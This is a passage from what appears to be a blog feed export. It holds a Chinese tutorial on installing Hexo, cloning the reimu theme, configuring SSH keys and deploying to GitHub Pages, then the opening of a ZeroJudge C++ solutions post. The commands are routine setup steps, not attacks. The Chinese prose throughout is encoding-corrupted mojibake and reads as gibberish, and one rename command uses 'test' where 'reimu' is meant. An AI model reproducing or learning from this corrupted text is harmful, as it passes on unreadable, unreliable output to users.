<li>æ‰“é–‹çµ‚ç«¯æ©Ÿï¼Œè¼¸å…¥ï¼š</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo init my-blog</span><br></pre></td></tr></table></figure>
<p>é€™æœƒåœ¨ç›®å‰è·¯å¾‘ä¸‹å»ºç«‹ä¸€å€‹åç‚º <code>my-blog</code> çš„è³‡æ–™å¤¾ï¼Œè£¡é¢åŒ…å« Hexo å°ˆæ¡ˆçš„æ‰€æœ‰åŸºæœ¬æ¶æ§‹è³‡æ–™å¤¾å’Œæª”æ¡ˆã€‚</p>
<ol start="2">
<li>é€²å…¥é€™å€‹è³‡æ–™å¤¾ï¼š</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> my-blog</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>å®‰è£ Hexo éœ€è¦çš„ä¾è³´å¥—ä»¶ï¼š</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install</span><br></pre></td></tr></table></figure>

<p>é€™æ¨£å­ä½ çš„ Hexo å°ˆæ¡ˆè³‡æ–™å¤¾å°±åˆå§‹åŒ–å®Œæˆäº†ã€‚</p>
<h3 id="æª”æ¡ˆä»‹ç´¹"><a href="#æª”æ¡ˆä»‹ç´¹" class="headerlink" title="æª”æ¡ˆä»‹ç´¹"></a>æª”æ¡ˆä»‹ç´¹</h3><p>æª”æ¡ˆä»‹ç´¹<br>é€™é‚Šæœ‰å¹¾å€‹æ¯”è¼ƒé‡è¦çš„æª”æ¡ˆ&#x2F;è³‡æ–™å¤¾ï¼Œç¨å¾®ä»‹ç´¹ä¸€ä¸‹ï¼š</p>
<h4 id="package-json"><a href="#package-json" class="headerlink" title="package.json"></a>package.json</h4><p>Hexo çš„æ–‡ç« å…§å®¹æ˜¯ä½¿ç”¨ ejs ç­‰æ¨¡æ¿èªè¨€ä¾†æ’°å¯«ï¼Œç¶“è§£æå¾Œæ¸²æŸ“æˆéœæ…‹çš„ HTMLï¼Œæ‰€ä»¥å¯ä»¥åœ¨ package.json çš„ dependencies è£¡é¢çœ‹åˆ° ejs, stylus, markdown çš„ renderer-package</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;dependencies&quot;: &#123;</span><br><span class="line">    &quot;hexo&quot;: &quot;^5.0.0&quot;,</span><br><span class="line">    &quot;hexo-generator-archive&quot;: &quot;^1.0.0&quot;,</span><br><span class="line">    &quot;hexo-generator-category&quot;: &quot;^1.0.0&quot;,</span><br><span class="line">    &quot;hexo-generator-index&quot;: &quot;^2.0.0&quot;,</span><br><span class="line">    &quot;hexo-generator-tag&quot;: &quot;^1.0.0&quot;,</span><br><span class="line">    &quot;hexo-renderer-ejs&quot;: &quot;^2.0.0&quot;,</span><br><span class="line">    &quot;hexo-renderer-marked&quot;: &quot;^4.0.0&quot;,</span><br><span class="line">    &quot;hexo-renderer-stylus&quot;: &quot;^2.0.0&quot;,</span><br><span class="line">    &quot;hexo-server&quot;: &quot;^2.0.0&quot;,</span><br><span class="line">    &quot;hexo-theme-landscape&quot;: &quot;^0.0.3&quot;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<h4 id="scaffolds"><a href="#scaffolds" class="headerlink" title="scaffolds&#x2F;"></a>scaffolds&#x2F;</h4><p>scaffolds è³‡æ–™å¤¾ä¸­æœ‰ä¸‰å€‹æª”æ¡ˆï¼š draft.md, page.md, post.md</p>
<p>é€™äº›æ˜¯æª”æ¡ˆæ¨¡æ¿ï¼Œæ¯ä½¿ç”¨ $ hexo new <type> <name> å‰µé€ ä¸€å€‹æ–°çš„è²¼æ–‡æˆ–é é¢ï¼ŒHexo å°±æœƒä½¿ç”¨ scaffolds ä¸­çš„æ¨¡æ¿ç‚ºä½ å»ºç«‹æª”æ¡ˆé››å‹ã€‚</p>
<h4 id="source"><a href="#source" class="headerlink" title="source&#x2F;"></a>source&#x2F;</h4><p>source è³‡æ–™å¤¾æ”¾è‘—é€™å€‹ç¶²ç«™æ‰€æœ‰çš„è³‡æºã€‚å‰ç¶´è©å¸¶æœ‰åº•ç·šçš„è³‡æ–™å¤¾æœƒè¢« Hexo å¿½ç•¥ï¼Œ_post é™¤å¤–ï¼Œå› ç‚ºé€™è£¡é¢æ”¾çš„æ˜¯æˆ‘å€‘è¦ä¸Šæ¶çš„æ–‡ç« ã€‚é€™äº›éœæ…‹æª”æ¡ˆï¼ˆMarkdown, HTML ç­‰ï¼‰åœ¨ build å®Œå¾Œæœƒè¢«æ”¾é€² public è³‡æ–™å¤¾ï¼Œè€Œå…¶ä»–çš„æª”æ¡ˆå‰‡æ˜¯ç”¨è¤‡è£½çš„æ–¹å¼ã€‚</p>
<h4 id="theme"><a href="#theme" class="headerlink" title="theme&#x2F;"></a>theme&#x2F;</h4><p>theme è³‡æ–™å¤¾ç”¨ä¾†æ”¾ä½ˆæ™¯ä¸»é¡Œç›¸é—œçš„å„ç¨®è³‡æ–™ï¼Œå®˜æ–¹é è¨­çš„ä½ˆæ™¯ä¸»é¡Œæ˜¯ landscapeï¼Œå¦‚æœæƒ³è¦æ›ä½ˆæ™¯ï¼Œä¹Ÿå¯ä»¥åˆ°å®˜æ–¹çš„ theme shop å»æ‰¾ä½ å–œæ­¡çš„ä¸»é¡Œï¼Œä¸‹è¼‰å¾Œæ•´åŒ…æ”¾åˆ° themes&#x2F; ä¸‹é¢ä¾†ä½¿ç”¨</p>
<p>(ä¸»é¡Œç›¡é‡æŒ‘é¸è¿‘æœŸå¾ˆå¤šäººç©©å®šåœ¨ç¶­è­·çš„å°ˆæ¡ˆ)</p>
<h4 id="config-yml"><a href="#config-yml" class="headerlink" title="_config.yml"></a>_config.yml</h4><p>_config.yml æ˜¯æˆ‘å€‘æœ€é‡è¦çš„è¨­å®šæª”ï¼Œé€™å€‹æª”æ¡ˆä¸­å¯ä»¥é‡å°æˆ‘å€‘çš„å…¨ç«™å‘ˆç¾æ–¹å¼åšè¨­å®š</p>
<h3 id="ç›´æ¥å¥—æ¨¡æ¿"><a href="#ç›´æ¥å¥—æ¨¡æ¿" class="headerlink" title="ç›´æ¥å¥—æ¨¡æ¿"></a>ç›´æ¥å¥—æ¨¡æ¿</h3><p>æ¥ä¸‹ä¾†æ‰¾ä¸€å€‹ä½ æƒ³ä½¿ç”¨çš„ Hexo ä¸»é¡Œï¼ˆä¾‹å¦‚å¸¸è¦‹çš„ NexTã€Butterflyã€Reimu ç­‰ï¼‰ï¼Œé€šå¸¸ä¸»é¡Œæœƒæ”¾åœ¨ GitHub ä¸Šï¼Œä¸‹è¼‰æˆ–ä½¿ç”¨ Git clone è¤‡è£½ä¸»é¡Œé€²å…¥ä½ çš„ Hexo å°ˆæ¡ˆçš„ <code>themes</code> ç›®éŒ„å…§ã€‚</p>
<blockquote>
<p>å¦‚æœä½ ä¸æƒ³é‚£éº¼éº»ç…©å¯ä»¥ç›´æ¥</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/D-Sketon/reimu-template</span><br><span class="line"><span class="built_in">cd</span> reimu-template</span><br><span class="line">npm install</span><br><span class="line">hexo server</span><br></pre></td></tr></table></figure>
<p>å·²é å…ˆå®‰è£ hexoã€hexo-theme-reimu åŠå…¶ä»–ç›¸é—œåŠŸèƒ½å¥—ä»¶ï¼Œåªéœ€è¦æŒ‰ç…§ä»¥ä¸‹æ­¥é©Ÿæ“ä½œï¼šè¤‡è£½å€‰åº«ã€å®‰è£ä¾è³´ã€ä¿®æ”¹é…ç½®ï¼Œå³å¯å–å¾—ä¸€å€‹åŸºæœ¬çš„éƒ¨è½æ ¼ï¼<br>å®Œæˆé€™æ­¥å¯ä»¥ç›´æ¥è·³åˆ° <a href="#%E9%83%A8%E7%BD%B2%E5%88%B0-github-pages">éƒ¨ç½²åˆ° GitHub Pages</a></p>
</blockquote>
<p>ä¾‹å¦‚ä»¥æˆ‘é€™blogç”¨çš„ reimu  ç‚ºä¾‹ï¼ŒåŸ·è¡Œï¼š<br>  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> themes</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/D-Sketon/hexo-theme-reimu.git</span><br></pre></td></tr></table></figure><br>ä¸¦ä¸”é‡å‘½åç‚ºâ€reimuâ€:<br>  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Rename-Item -Path .\hexo-theme-reimu -NewName <span class="built_in">test</span> </span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>âš ï¸ <strong>æ³¨æ„ï¼å¦‚æœåŸ·è¡Œä¸»é¡Œè³‡æ–™å¤¾é‡å‘½åæŒ‡ä»¤æ™‚ï¼Œé‡åˆ°é¡ä¼¼ä»¥ä¸‹éŒ¯èª¤ï¼š</strong>  </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ç„¡æ³•ç§»é™¤ C:\Users\...\.git é …ç›®: æ‚¨æ²’æœ‰è¶³å¤ çš„å­˜å–æ¬Šé™ä¾†åŸ·è¡Œæ­¤æ“ä½œã€‚</span><br></pre></td></tr></table></figure>



<p>è«‹ä½¿ç”¨ä¸‹æ–¹æŒ‡ä»¤å˜—è©¦è§£æ±ºæ­¤å•é¡Œï¼š  </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">robocopy .\hexo-theme-reimu .\reimu /E</span><br><span class="line">Remove-Item .\hexo-theme-reimu -Recurse -Force</span><br></pre></td></tr></table></figure>
<p>é€™çµ„æŒ‡ä»¤æœƒè¤‡è£½ä¸»é¡Œè³‡æ–™å¤¾ä¸¦å¼·åˆ¶åˆªé™¤åŸè³‡æ–™å¤¾çš„ <code>.git</code> ç­‰è¢«é–å®šæª”æ¡ˆï¼Œå¸¸è¦‹æ–¼ Windows æ¬Šé™æˆ–é–å®šå°è‡´çš„ç„¡æ³•ç§»é™¤å•é¡Œã€‚</p>
</blockquote>
<p><img src="/img/Hexo/themes.webp" alt="reimu"></p>
<p>ç„¶å¾Œåœ¨ <code>_config.yml</code> è£¡é¢è¨­å®šï¼š  </p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">theme:</span> <span class="string">reimu</span></span><br></pre></td></tr></table></figure>

<hr>
<p>å®Œæ•´æµç¨‹ç¯„ä¾‹å¦‚ä¸‹ï¼š  </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo init my-blog</span><br><span class="line"><span class="built_in">cd</span> my-blog</span><br><span class="line">npm install</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> themes</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/D-Sketon/hexo-theme-reimu.git</span><br><span class="line">Rename-Item -Path .\hexo-theme-reimu -NewName reimu</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¿®æ”¹ _config.yml è£¡çš„ theme: reimu</span></span><br><span class="line"></span><br><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure>

<p>å®Œæˆå¾Œå°±å¯ä»¥åœ¨æœ¬åœ°ç€è¦½å™¨æ‰“é–‹ <a href="http://localhost:4000/">http://localhost:4000</a> é è¦½æ–°ä¸»é¡Œéƒ¨è½æ ¼æ¨£è²Œã€‚<br><img src="/img/Hexo/run.webp" alt="run"></p>
<h2 id="éƒ¨ç½²åˆ°-GitHub-Pages"><a href="#éƒ¨ç½²åˆ°-GitHub-Pages" class="headerlink" title="éƒ¨ç½²åˆ° GitHub Pages"></a>éƒ¨ç½²åˆ° GitHub Pages</h2><p>åœ¨é–‹å§‹éƒ¨ç½²ä¹‹å‰ï¼Œè«‹å…ˆå®Œæˆ SSH é‡‘é‘°è¨­å®šï¼Œä»¥é¿å…å¸¸è¦‹çš„æ¬Šé™å•é¡Œï¼š</p>
<h3 id="SSH-é‡‘é‘°è¨­å®šæ­¥é©Ÿ"><a href="#SSH-é‡‘é‘°è¨­å®šæ­¥é©Ÿ" class="headerlink" title="SSH é‡‘é‘°è¨­å®šæ­¥é©Ÿ"></a>SSH é‡‘é‘°è¨­å®šæ­¥é©Ÿ</h3><h4 id="å»ºç«‹-ssh-ç›®éŒ„"><a href="#å»ºç«‹-ssh-ç›®éŒ„" class="headerlink" title="å»ºç«‹ .ssh ç›®éŒ„"></a><strong>å»ºç«‹ <code>.ssh</code> ç›®éŒ„</strong></h4><p>   åœ¨ PowerShell åŸ·è¡Œï¼š<br>   <figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">mkdir <span class="variable">$env:USERPROFILE</span>\.ssh</span><br></pre></td></tr></table></figure><br>   ï¼ˆå¦‚å·²æœ‰æ­¤ç›®éŒ„å¯ç•¥éï¼‰</p>
<h4 id="ç”¢ç”Ÿ-SSH-é‡‘é‘°"><a href="#ç”¢ç”Ÿ-SSH-é‡‘é‘°" class="headerlink" title="ç”¢ç”Ÿ SSH é‡‘é‘°"></a><strong>ç”¢ç”Ÿ SSH é‡‘é‘°</strong></h4>   <figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">ssh<span class="literal">-keygen</span> <span class="literal">-t</span> ed25519 <span class="literal">-C</span> <span class="string">&quot;your_email@example.com&quot;</span></span><br></pre></td></tr></table></figure>
<p>   æŒ‰ Enter ä½¿ç”¨é è¨­è·¯å¾‘åŠåƒæ•¸ã€‚</p>
<h4 id="å°‡å…¬é‘°åŠ å…¥-GitHub"><a href="#å°‡å…¬é‘°åŠ å…¥-GitHub" class="headerlink" title="å°‡å…¬é‘°åŠ å…¥ GitHub"></a><strong>å°‡å…¬é‘°åŠ å…¥ GitHub</strong></h4><p>   åŸ·è¡Œï¼š<br>   <figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> <span class="variable">$env:USERPROFILE</span>\.ssh\id_ed25519.pub</span><br></pre></td></tr></table></figure><br>   è¤‡è£½é¡¯ç¤ºå…§å®¹ï¼Œå‰å¾€ GitHub â†’ Settings â†’ SSH and GPG keys â†’ New SSH keyï¼Œè²¼ä¸Šå…§å®¹ä¸¦å„²å­˜ã€‚<br>   è¨»ï¼šé€£çµ â†’ <a href="https://github.com/settings/keys">https://github.com/settings/keys</a></p>
<h4 id="æ¸¬è©¦-SSH-é€£ç·š"><a href="#æ¸¬è©¦-SSH-é€£ç·š" class="headerlink" title="æ¸¬è©¦ SSH é€£ç·š"></a><strong>æ¸¬è©¦ SSH é€£ç·š</strong></h4>   <figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">ssh <span class="literal">-T</span> git@github.com</span><br></pre></td></tr></table></figure>
<p>   è‹¥å‡ºç¾<br>   <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Hi &lt;username&gt;! You&#x27;ve successfully authenticated</span><br></pre></td></tr></table></figure><br>   è¡¨ç¤ºè¨­å®šæˆåŠŸã€‚</p>
<h4 id="å›ä¸»é¡Œç›®ï¼Œé–‹å§‹éƒ¨ç½²"><a href="#å›ä¸»é¡Œç›®ï¼Œé–‹å§‹éƒ¨ç½²" class="headerlink" title="å›ä¸»é¡Œç›®ï¼Œé–‹å§‹éƒ¨ç½²"></a><strong>å›ä¸»é¡Œç›®ï¼Œé–‹å§‹éƒ¨ç½²</strong></h4><p>å®Œæˆ SSH è¨­å®šå¾Œï¼Œé–‹å§‹é€²è¡Œ Hexo éƒ¨ç½²ï¼š</p>
<ul>
<li><p>å»ºç«‹ GitHub å€‰åº«ï¼Œé€šå¸¸å‘½åç‚º <code>ä½ çš„å¸³è™Ÿ.github.io</code>ï¼Œå¦‚ <code>itousouta15.github.io</code>ã€‚<br><img src="/img/Hexo/%E5%89%B5%E5%BB%BArepo.webp"></p>
</li>
<li><p>åœ¨ Hexo å°ˆæ¡ˆæ ¹ç›®éŒ„å®‰è£éƒ¨ç½²å¤–æ›ï¼š  </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>
</li>
<li><p>å…ˆåˆå§‹åŒ– git</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git init</span><br></pre></td></tr></table></figure>
</li>
<li><p>ä¿®æ”¹ <code>_config.yml</code>ï¼Œå¢åŠ éƒ¨ç½²è¨­å®šï¼š  </p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">  <span class="attr">repository:</span> <span class="string">git@github.com:itousouta15/&lt;ä½ çš„-repo&gt;.git</span></span><br><span class="line">  <span class="attr">branch:</span> <span class="string">main</span></span><br></pre></td></tr></table></figure>
<p><img src="/img/Hexo/deploy.webp" alt="deploy"></p>
</li>
<li><p>ç”Ÿæˆéœæ…‹æª”ä¸¦éƒ¨ç½²ï¼š  </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo generate</span><br><span class="line">hexo deploy</span><br></pre></td></tr></table></figure>
</li>
<li><p>ç¢ºèª GitHub Pages åŠŸèƒ½å·²é–‹å•Ÿï¼Œç­‰å€™ç‰‡åˆ»å¾Œç€è¦½ <code>https://ä½ çš„å¸³è™Ÿ.github.io</code> å³å®Œæˆç·šä¸Šéƒ¨ç½²ã€‚<br><img src="/img/Hexo/github.webp" alt="github"></p>
</li>
</ul>
<h3 id="å¸¸è¦‹ç–‘é›£æ’è§£"><a href="#å¸¸è¦‹ç–‘é›£æ’è§£" class="headerlink" title="å¸¸è¦‹ç–‘é›£æ’è§£"></a>å¸¸è¦‹ç–‘é›£æ’è§£</h3><blockquote>
<h4 id="SSH-é‡‘é‘°æ¬Šé™éŒ¯èª¤åŠ-ssh-ç›®éŒ„ç„¡æ³•å»ºç«‹"><a href="#SSH-é‡‘é‘°æ¬Šé™éŒ¯èª¤åŠ-ssh-ç›®éŒ„ç„¡æ³•å»ºç«‹" class="headerlink" title="SSH é‡‘é‘°æ¬Šé™éŒ¯èª¤åŠ .ssh ç›®éŒ„ç„¡æ³•å»ºç«‹"></a>SSH é‡‘é‘°æ¬Šé™éŒ¯èª¤åŠ <code>.ssh</code> ç›®éŒ„ç„¡æ³•å»ºç«‹</h4><ul>
<li><strong>éŒ¯èª¤è¨Šæ¯ï¼š</strong>  <ul>
<li><code>git@github.com: Permission denied (publickey)</code>  </li>
<li><code>Could not create directory &#39;/c/Users/\xxx/.ssh&#39;</code>ï¼ˆäº‚ç¢¼è·¯å¾‘ï¼‰</li>
</ul>
</li>
<li><strong>åŸå› ï¼š</strong><br>Windows ä½¿ç”¨è€…åç¨±å«æœ‰ä¸­æ–‡æˆ–ç‰¹æ®Šç¬¦è™Ÿï¼Œç³»çµ±æˆ– Git è§£æè·¯å¾‘æ™‚ç”¢ç”Ÿäº‚ç¢¼ï¼Œå°è‡´ç„¡æ³•å»ºç«‹ <code>.ssh</code> ç›®éŒ„ã€‚  </li>
<li><strong>è§£æ±ºæ–¹æ³•ï¼š</strong>  <ol>
<li>æ‰‹å‹•å»ºç«‹æ­£ç¢ºçš„ <code>.ssh</code> ç›®éŒ„ï¼š  <figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">mkdir <span class="variable">$env:USERPROFILE</span>\.ssh</span><br></pre></td></tr></table></figure></li>
<li>ç”¢ç”Ÿ SSH é‡‘é‘°ä¸¦åŠ å…¥ GitHubï¼š  <figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">ssh<span class="literal">-keygen</span> <span class="literal">-t</span> ed25519 <span class="literal">-C</span> <span class="string">&quot;your_email@example.com&quot;</span></span><br><span class="line"><span class="built_in">cat</span> <span class="variable">$env:USERPROFILE</span>\.ssh\id_ed25519.pub</span><br></pre></td></tr></table></figure>
å°‡å…¬é‘°å…§å®¹è¤‡è£½è²¼è‡³ GitHub SSH Keys é é¢ã€‚  </li>
<li>å°‡ Git æŒ‡ä»¤è¨­å®šä½¿ç”¨çµ•å°è·¯å¾‘è¼‰å…¥é‡‘é‘°ï¼Œæ³¨æ„è·¯å¾‘è¦æœ‰åæ–œç·šï¼š  <figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">git config <span class="literal">--global</span> core.sshCommand <span class="string">&quot;ssh -i C:/Users/ä¼Šè—¤è’¼å¤ª/.ssh/id_ed25519&quot;</span></span><br></pre></td></tr></table></figure></li>
<li>æ¸¬è©¦ SSH é€£ç·šï¼š  <figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">ssh <span class="literal">-T</span> git@github.com</span><br></pre></td></tr></table></figure>
æ­£å¸¸æ‡‰é¡¯ç¤ºã€ŒHi <username>! Youâ€™ve successfully authenticatedã€ã€‚  </li>
<li>å†è©¦ <code>git push</code> èˆ‡ <code>hexo deploy</code>ã€‚</li>
</ol>
</li>
</ul>
<h4 id="Git-å€‰åº«åˆå§‹åŒ–éŒ¯èª¤"><a href="#Git-å€‰åº«åˆå§‹åŒ–éŒ¯èª¤" class="headerlink" title="Git å€‰åº«åˆå§‹åŒ–éŒ¯èª¤"></a>Git å€‰åº«åˆå§‹åŒ–éŒ¯èª¤</h4><ul>
<li><strong>éŒ¯èª¤è¨Šæ¯ï¼š</strong><br><code>fatal: Not a git repository (or any of the parent directories): .git</code>  </li>
<li><strong>åŸå› ï¼š</strong><br>åŸ·è¡Œ Git æŒ‡ä»¤çš„è³‡æ–™å¤¾é Hexo å°ˆæ¡ˆæ ¹ç›®éŒ„ï¼Œæˆ–è©²è³‡æ–™å¤¾å°šæœªåˆå§‹åŒ– Gitã€‚  </li>
<li><strong>è§£æ±ºæ–¹æ³•ï¼š</strong>  <ol>
<li>åˆ‡æ›è‡³ Hexo å°ˆæ¡ˆæ ¹ç›®éŒ„ï¼ˆå« <code>.git</code>ï¼‰ã€‚  </li>
<li>è‹¥å°šæœªåˆå§‹åŒ–ï¼ŒåŸ·è¡Œï¼š  <figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">git init</span><br><span class="line">git remote add origin git@github.com:itousouta15/&lt;ä½ çš„<span class="literal">-repo</span>&gt;.git</span><br></pre></td></tr></table></figure></li>
<li>å†åŸ·è¡Œ <code>hexo deploy</code>ã€‚</li>
</ol>
</li>
</ul>
<h4 id="Submodule-è­¦å‘Š"><a href="#Submodule-è­¦å‘Š" class="headerlink" title="Submodule è­¦å‘Š"></a>Submodule è­¦å‘Š</h4><ul>
<li><strong>å…§å®¹ï¼š</strong><br><code>themes/reimu</code> è³‡æ–™å¤¾ç‚ºç¨ç«‹ git å€‰åº«ï¼ŒGit æœƒè­¦å‘Šæ­¤ç‚º submoduleã€‚  </li>
<li><strong>å»ºè­°ï¼š</strong><br>ä½¿ç”¨ Git submodule ç®¡ç†æˆ–åˆªé™¤ <code>themes/reimu</code> çš„ <code>.git</code> è³‡æ–™å¤¾ï¼Œé¿å… clone ä¸å®Œæ•´ã€‚</li>
</ul>
<h4 id="LF-èˆ‡-CRLF-è¡Œå°¾æ ¼å¼è­¦å‘Š"><a href="#LF-èˆ‡-CRLF-è¡Œå°¾æ ¼å¼è­¦å‘Š" class="headerlink" title="LF èˆ‡ CRLF è¡Œå°¾æ ¼å¼è­¦å‘Š"></a>LF èˆ‡ CRLF è¡Œå°¾æ ¼å¼è­¦å‘Š</h4><ul>
<li><strong>èªªæ˜ï¼š</strong><br>Git åœ¨ Windows ç’°å¢ƒæœƒæç¤ºè¡Œå°¾ç¢¼è½‰æ›ï¼Œç‚ºæ­£å¸¸æƒ…æ³ã€‚</li>
</ul>
<h4 id="æˆåŠŸéƒ¨ç½²è¨Šæ¯"><a href="#æˆåŠŸéƒ¨ç½²è¨Šæ¯" class="headerlink" title="æˆåŠŸéƒ¨ç½²è¨Šæ¯"></a>æˆåŠŸéƒ¨ç½²è¨Šæ¯</h4><ul>
<li>ä½ æœƒçœ‹åˆ°é¡ä¼¼ä»¥ä¸‹å…§å®¹ï¼š  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Enumerating objects... </span><br><span class="line">Writing objects... </span><br><span class="line">To github.com:itousouta15/test.github.io.git</span><br><span class="line">INFO  Deploy done: git</span><br></pre></td></tr></table></figure></li>
<li>å¦‚æœå‡ºç¾éƒ¨åˆ† <code>known_hosts</code> è­¦å‘Šï¼Œä¸å½±éŸ¿ Git æ“ä½œèˆ‡ Hexo éƒ¨ç½²ã€‚</li>
</ul>
</blockquote>
<h3 id="æ—¥å¸¸ä½¿ç”¨èˆ‡ç¶­è­·"><a href="#æ—¥å¸¸ä½¿ç”¨èˆ‡ç¶­è­·" class="headerlink" title="æ—¥å¸¸ä½¿ç”¨èˆ‡ç¶­è­·"></a>æ—¥å¸¸ä½¿ç”¨èˆ‡ç¶­è­·</h3><ul>
<li>ä½¿ç”¨ Hexo CLI ç®¡ç†æ–‡ç« ï¼š<br>æ–°å¢æ–‡ç«   <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo new post <span class="string">&quot;æ–‡ç« æ¨™é¡Œ&quot;</span></span><br></pre></td></tr></table></figure>
ç·¨è¼¯å®Œæˆå¾Œç”¢ç”Ÿä¸¦éƒ¨ç½²ï¼š  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo generate</span><br><span class="line">hexo deploy</span><br></pre></td></tr></table></figure></li>
<li>å®šæœŸæ›´æ–° Hexoã€ä¸»é¡Œèˆ‡å¤–æ›ï¼Œä¿æŒå®‰å…¨èˆ‡åŠŸèƒ½æ­£å¸¸ã€‚  </li>
<li>ä¾éœ€è¦è‡ªè¨‚ä¸»é¡Œé…ç½®ï¼Œå¦‚é¢¨æ ¼ã€é¸å–®ã€è©•è«–ç³»çµ±ç­‰ã€‚</li>
</ul>
<h3 id="é€²éšå„ªåŒ–"><a href="#é€²éšå„ªåŒ–" class="headerlink" title="é€²éšå„ªåŒ–"></a>é€²éšå„ªåŒ–</h3><ul>
<li>åŠ å…¥è‡ªè¨‚ç¶²åŸŸï¼Œæ›¿ä»£é è¨­ GitHub Pages çš„ç¶²å€ã€‚  </li>
<li>ä½¿ç”¨ CDN æˆ– Cloudflare æå‡å…¨çƒè¨ªå•é€Ÿåº¦èˆ‡å®‰å…¨ã€‚  </li>
<li>é…ç½® SSL è­‰æ›¸æ”¯æ´ HTTPSã€‚  </li>
<li>æ•´åˆ SEOã€ç¶²ç«™åˆ†æå·¥å…·ã€‚  </li>
<li>ä½¿ç”¨ CI&#x2F;CD å·¥å…·è‡ªå‹•åŒ–éƒ¨ç½²æµç¨‹ã€‚</li>
</ul>
<p><img src="/img/Hexo/page.webp" alt="page"></p>
<p>é€™ç¯‡æ–‡ç« å°±åˆ°æ­¤ç‚ºæ­¢!æˆ‘å€‘ä¸‹æ¬¡è¦‹!</p>
]]></content>
      <categories>
        <category>ç¨‹å¼é–‹ç™¼</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>å‰ç«¯é–‹ç™¼</tag>
      </tags>
  </entry>
  <entry>
    <title>Zerojudge ç¨‹å¼è§£é¡Œç­†è¨˜</title>
    <url>/2025/07/11/zerojudge/</url>
    <content><![CDATA[<h2 id="ğŸ“š-é¡Œè§£ç¸½è¦½"><a href="#ğŸ“š-é¡Œè§£ç¸½è¦½" class="headerlink" title="ğŸ“š é¡Œè§£ç¸½è¦½"></a>ğŸ“š é¡Œè§£ç¸½è¦½</h2><p>é€™è£¡è¨˜éŒ„äº†æˆ‘åœ¨ ZeroJudge å¹³å°ä¸Šçš„è§£é¡Œéç¨‹èˆ‡å¿ƒå¾—ï¼ŒæŒ‰ç…§é¡Œç›®åˆ†é¡æ•´ç†ã€‚å¾åŸºç¤çš„å…¥é–€é¡Œåˆ°é€²éšçš„ APCS ç«¶è³½é¡Œï¼Œæ¯é“é¡Œéƒ½åŒ…å«äº†è§£é¡Œæ€è·¯å’Œç¨‹å¼ç¢¼å¯¦ä½œã€‚</p>
<p><strong>ç›®å‰æ”¶éŒ„é¡Œç›®æ•¸é‡</strong>ï¼š40+ é¡Œ<br><strong>æ¶µè“‹ç¯„åœ</strong>ï¼šåŸºç¤èªæ³•ã€æ•¸å­¸é‹ç®—ã€å­—ä¸²è™•ç†ã€è³‡æ–™çµæ§‹ã€æ¼”ç®—æ³•ã€APCS ç«¶è³½é¡Œ<br><strong>ç¨‹å¼èªè¨€</strong>ï¼šC++</p>
<span id="more"></span>

<hr>
<h2 id="ğŸŸ¢-åŸºç¤å…¥é–€ç³»åˆ—"><a href="#ğŸŸ¢-åŸºç¤å…¥é–€ç³»åˆ—" class="headerlink" title="ğŸŸ¢ åŸºç¤å…¥é–€ç³»åˆ—"></a>ğŸŸ¢ åŸºç¤å…¥é–€ç³»åˆ—</h2><h3 id="a001-å“ˆå›‰"><a href="#a001-å“ˆå›‰" class="headerlink" title="a001. å“ˆå›‰"></a>a001. å“ˆå›‰</h3><p><strong>é¡Œç›®é€£çµ</strong>ï¼š<a href="https://zerojudge.tw/ShowProblem?problemid=a001">https://zerojudge.tw/ShowProblem?problemid=a001</a><br><strong>è§£é¡Œé‡é»</strong>ï¼šåŸºæœ¬è¼¸å…¥è¼¸å‡ºæ“ä½œ</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    string s;</span><br><span class="line">    <span class="keyword">while</span>(cin &gt;&gt; s)&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;hello, &quot;</span>&lt;&lt; s &lt;&lt; <span 